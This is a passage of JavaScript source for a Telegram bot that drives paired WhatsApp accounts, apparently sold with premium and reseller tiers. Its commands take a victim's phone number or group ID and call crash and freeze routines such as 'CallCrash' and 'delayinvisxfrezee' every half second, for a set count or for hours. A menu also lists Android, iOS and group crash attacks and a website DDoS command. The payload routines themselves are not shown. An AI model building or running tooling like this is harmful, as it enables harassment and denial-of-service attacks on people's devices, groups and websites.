        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, LoveLogo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            for (let i = 0; i < count; i++) {
                await testlogic.test(client, targetJid);
                await delay(2000);
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            while (Date.now() < endTime) {
                await testlogic.test(client, targetJid);
                await delay(2000);
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['IosInvisible', 'IosInvisiblexi', 'IosInvisiblex', 'hidenseek'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +919876543210 1`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, LoveLogo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            for (let i = 0; i < count; i++) {
                await IosLogic.IosInvisible(client, targetJid);
                await delay(500);
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            while (Date.now() < endTime) {
                await CallLogic.CallCrash(client, targetJid);
                await delay(500);
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
})


SYLoVe('delayxceed', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', '');

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: ${s7CM} +919876543210 1`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, LoveLogo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            for (let i = 0; i < count; i++) {
                await XLogic.delayinvisxfrezee(client, targetJid);
                await delay(500);
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            while (Date.now() < endTime) {
                await XLogic.delayinvisxfrezee(client, targetJid);
                await delay(500);
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

        
                
        SYLoVe('listprem', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
        }
    if (chatId !== config.adminId) {
        return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
    }

    let db = getDB();
    if (db.premium.length === 0) {
        return S7.sendMessage(chatId, 'No premium users found.');
    }

    let text = 'Premium List:\n\n';

    for (let i = 0; i < db.resellers.length; i++) {
        const id = db.resellers[i].toString();
        try {
            const user = await S7.getChat(id);
            const username = user.username ? `@${user.username} : ` : '';
            text += `${i + 1}. ${username}<code>${id}</code>\n`;
        } catch (e) {
            text += `${i + 1}. \`${id}\`\n`;
        }
    }
    text += '\n──────────────────';

    S7.sendMessage(chatId, text, {
        parse_mode: 'HTML'
    });
});        
        SYLoVe('listgc', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();

        if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
        }

    if (!waSessions || Object.keys(waSessions).length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    let text = `⬣ <b>LIST OF WHATSAPP GROUPS</b>\n\n`;
    let totalGroups = 0;
    let index = 1;

    for (const chatKey of Object.keys(waSessions)) {
        for (const session of waSessions[chatKey]) {
            const sock = session.sock;
            const num = session.num;

            try {
                const groupsObj = await sock.groupFetchAllParticipating();
                const groups = Object.values(groupsObj);

                if (groups.length === 0) continue;

                text += `📱 <b>Number:</b> <code>${num}</code>\n`;
                text += `━━━━━━━━━━━━━━━\n`;

                for (const group of groups) {
                    const meta = await sock.groupMetadata(group.id);

                    text += `❏ Group ${index++}\n`;
                    text += `│⭔ <b>Name:</b> ${meta.subject}\n`;
                    text += `│⭔ <b>ID:</b> <code>${meta.id}</code>\n`;
                    text += `│⭔ <b>Members:</b> ${meta.participants.length}\n`;
                    text += `╰──────────────\n\n`;

                    totalGroups++;
                }
            } catch (err) {
                log('error', 'LISTGC', `Failed for ${num}: ${err.message}`);
            }
        }
    }

    if (totalGroups === 0) {
        return S7.sendMessage(chatId, '❌ No groups found on connected numbers.');
    }

    text =
        `⬣ <b>LIST OF GROUP BELOW</b>\n\n` +
        `📦 <b>Total Groups:</b> ${totalGroups}\n\n` +
        text;

    if (text.length > 4000) {
        const filePath = './Love/listgc.txt';
        fs.writeFileSync(filePath, text.replace(/<[^>]*>/g, ''));
        return S7.sendDocument(chatId, filePath);
    }

    S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
});
        SYLoVe('state', (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');
    const value = args[1];
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
        }

    if (chatId !== config.adminId) {
        return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
    }

    if (value !== '0' && value !== '1') {
        return S7.sendMessage(chatId, 'Usage: /state 0 | 1');
    }

    let db = getDB();
    db.state = Number(value);
    saveDB(db);

    S7.sendMessage(
        chatId,
        value === '0'
            ? '✅ State set to FREE MODE (All users allowed)'
            : '🔒 State set to PREMIUM ONLY MODE'
    );
});


        SYLoVe('listuser', (msg) => {
        const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
        }
            if (msg.chat.id.toString() !== config.adminId) {
                return S7.sendMessage(msg.chat.id, '🚫 You are not authorized to use this command.');
            }

            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(msg.chat.id, 'No users found.');

            const users = JSON.parse(fs.readFileSync(userFile));
            let list = 'User List:\n\n';
            users.forEach((u, i) => {
                list += `${i + 1}. ${u.name} (${u.id})\n`;
            });

            if (list.length > 4000) {
                const listPath = path.join(LoveDir, 'list.txt');
                fs.writeFileSync(listPath, list);
                S7.sendDocument(msg.chat.id, listPath);
            } else {
                S7.sendMessage(msg.chat.id, list);
            }
      });

                S7.on('callback_query', async (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const data = query.data;
            const userId = query.from.id;
            const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
    const uptime = getRuntime();
    const love = userId.toString();
    const S7edit = (text, opts) => {
        S7.editMessageCaption(text, opts).catch((err) => {
            if (!err.message.includes('message is not modified')) {
                log('error', 'SYSTEM', err.message);
            }
        });
    };
            if (data === 'check_membership') {
                const isMember = await CheckSYlovesToo(S7, userId);

                if (isMember) {
                    S7.deleteMessage(chatId, messageId).catch(() => {});
                    S7.sendMessage(chatId, 
                        `✅ <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, 
                        { parse_mode: 'HTML' }
                    );
                } else {
                    S7.answerCallbackQuery(query.id, { 
                        text: '❌ You have not joined both the Channel and Group yet!', 
                        show_alert: true 
                    });
                }
            };


            if (data === 'misc_menu') {
            const chatId = query.message.chat.id;
            const userId = query.from.id.toString();
            if (!LoveGlobalState(userId)) {
             return sendSYLove(S7, chatId);
                }
                const love = query.from.id.toString();
                const miscText = MainSYLoVe(name, uptime, love) + `
┌──────⟬ ⚇ 𝗠𝗶𝘀𝗰 𝗠𝗲𝗻𝘂 ⚇ ⟭──────┐
│⨴⨵ reqpair number
│⨴⨵ delpair number
│⨴⨵ addprem ID
│⨴⨵ delprem ID
│⨴⨵ addresell ID
│⨴⨵ delresell ID
│⨴⨵ addtoken token
│⨴⨵ deltoken token
│⨴⨵ listprem
│⨴⨵ listresell
│⨴⨵ listuser
│⨴⨵ mytoken 
│⨴⨵ state 0 | 1
└──────────────────────┘
                `;
                S7edit(miscText, { chat_id: chatId, message_id: messageId, ...Lovesbutton });
            }

            if (data === 'bug_menu') {
            const chatId = query.message.chat.id;
            const userId = query.from.id.toString();
            if (!LoveGlobalState(userId)) {
             return sendSYLove(S7, chatId);
                }
                const love = query.from.id.toString();
                const bugText = MainSYLoVe(name, uptime, love) + `
┌──────⟬ ⚇ 𝗕𝘂𝗴 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 ⚇ ⟭──────┐
│⨴⨵ delayxceed num time
│⨴⨵ nullfinity num time
│⨴⨵ BlankHard num
│⨴⨵ crashdroid num time
│⨴⨵ killsystem num time
│⨴⨵ forceblock num|amount 
└──────────────────────┘
┌──────⟬ ⚇ 𝗕𝘂𝗴 𝗶𝗢𝗦 ⚇ ⟭──────┐
│⨴⨵ hidenseek number time
│⨴⨵ IosInvisiblex number time
│⨴⨵ IosInvisiblexi number time
└──────────────────────┘
┌──────⟬ ⚇ 𝗕𝘂𝗴 Group ⚇ ⟭──────┐
│⨴⨵ xgroup groupid
│⨴⨵ groupmix groupid time
│⨴⨵ nullgc groupid time
│⨴⨵ groupui groupid time
│⨴⨵ listgc
└──────────────────────┘
┌──────⟬ ⚇ 𝗕𝘂𝗴 Web ⚇ ⟭──────┐
│⨴⨵ xxddos weblink time
└──────────────────────┘
                `;
                S7edit(bugText, { chat_id: chatId, message_id: messageId, ...Lovesbutton });
                }
           });

    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// Start SYLove Bot
startSYloveBot(config.mainToken);

// Start Extra Bots
const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => {
    startSYloveBot(obj.token);
});
} else {
    log('info', null, 'No extra bots found in database.');
}